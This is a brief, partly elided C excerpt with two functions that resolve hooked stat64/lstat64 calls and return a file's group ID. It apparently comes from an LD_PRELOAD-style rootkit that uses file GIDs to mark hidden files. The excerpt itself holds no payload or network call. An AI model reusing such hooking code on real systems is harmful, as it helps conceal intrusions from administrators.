...
gid_t get_path_gid64(const char *pathname){
	...
	hook(C__XSTAT64);
	if(mxstat64(pathname, &s_fstat) < 0)
		return 0;
	return s_fstat.st_gid;
}
...
static gid_t lget_path_gid64(const char *pathname){
	...
	memset(&s_fstat, 0, sizeof(stat64));
	hook(C__LXSTAT64);
	if(mlxstat64(pathname, &s_fstat) < 0)
		return 0;
	return s_fstat.st_gid;
}
